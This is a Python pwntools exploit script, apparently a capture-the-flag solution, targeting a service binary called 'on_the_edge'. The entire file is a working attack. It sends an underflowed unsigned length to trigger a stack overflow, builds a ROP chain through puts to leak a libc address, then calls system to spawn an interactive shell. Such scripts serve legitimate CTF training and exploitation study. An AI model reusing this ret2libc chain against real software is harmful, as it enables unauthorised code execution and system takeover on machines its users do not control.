# -*- coding: utf-8 -*-
# @Author: m4drat
# @Date:   2019-10-30 19:22:27

from pwn import *
import ctypes

#context(os='linux', arch='i386')
context(os='linux', arch='amd64')

context.terminal = ['tmux', 'new-window']
context.log_level = 2
local = False
fPath  = './on_the_edge'
taskIp = '127.0.0.1'
taskPort = 22014

libc = ELF('../deploy/service/libc.so.6')

if local:
    ps = process(fPath)
else:
    ps = remote(taskIp, taskPort)

#           pop rdi        puts got     puts                 main
leak = p64(0x401463) + p64(0x601F80) + p64(0x4008E0) + p64(0x400F68)

def main():
    ps.recv(4096)
    ps.sendline('v')
    ps.recv(4096)
    ps.sendline('0')
    ps.recv(4096)

    ps.sendline('e')
    ps.recv(4096)
    ps.sendline(str(ctypes.c_uint(-2).value))
    ps.recv(4096)
    # gdb.attach(ps)
    ps.sendline('A' * 26 + leak)
    libc_puts = u64(ps.recv(4096)[0:6] + '\x00' * 2)
    print('Puts libc: ' + hex(libc_puts))

    ps.sendline('e')
    ps.recv(4096)
    ps.sendline(str(ctypes.c_uint(-2).value))
    ps.recv(4096)
    # gdb.attach(ps)
    ps.sendline('A' * 26 + p64(0x401463) + p64((libc_puts - 456336) + 0x18cd57) + p64((libc_puts - 456336) + libc.symbols['system']))

    ps.interactive()

if __name__ == "__main__":
    main()